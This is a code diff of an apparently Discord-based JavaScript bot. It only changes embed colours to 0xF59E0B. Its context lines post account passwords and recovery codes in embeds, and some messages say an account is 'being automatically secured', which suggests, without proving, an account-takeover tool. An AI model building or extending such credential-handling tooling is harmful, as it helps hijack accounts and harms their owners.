@@ -127,7 +127,7 @@ module.exports = {
                                 { name: "Password", value: "```\n" + data.password + "\n```", inline: false },
                                 { name: "Recovery Code", value: "```\n" + data.recoveryCode + "\n```", inline: false }
                             ],
-                            color: 0xb2c7e0
+                            color: 0xF59E0B
                         }
                     ],
                     components: [
@@ -179,7 +179,7 @@ module.exports = {
                                 { name: "Password", value: "```\n" + data.password + "\n```", inline: false },
                                 { name: "Recovery Code", value: "```\n" + data.recoveryCode + "\n```", inline: false },
                             ],
-                            color: 0xb2c7e0
+                            color: 0xF59E0B
                         }
                     ],
                     components: [
@@ -203,7 +203,7 @@ module.exports = {
 
             const embed = {
                 title: `This account is being automatically secured, you will be dmed when finished`,
-                color: 0x808080
+                color: 0xF59E0B
             };
 
             const components = [
@@ -266,7 +266,7 @@ module.exports = {
 
                 const embed = {
                     title: 'This account is being automatically secured.',
-                    color: 0x808080
+                    color: 0xF59E0B
                 };
 
                 const components = [
@@ -338,7 +338,7 @@ module.exports = {
                             { name: "Password", value: "```\n" + data.password + "\n```", inline: false },
                             { name: "Recovery Code", value: "```\n" + data.recoveryCode + "\n```", inline: false }
                         ],
-                        color: 0xb2c7e0
+                        color: 0xF59E0B
                     }
                 ],
                 components: [
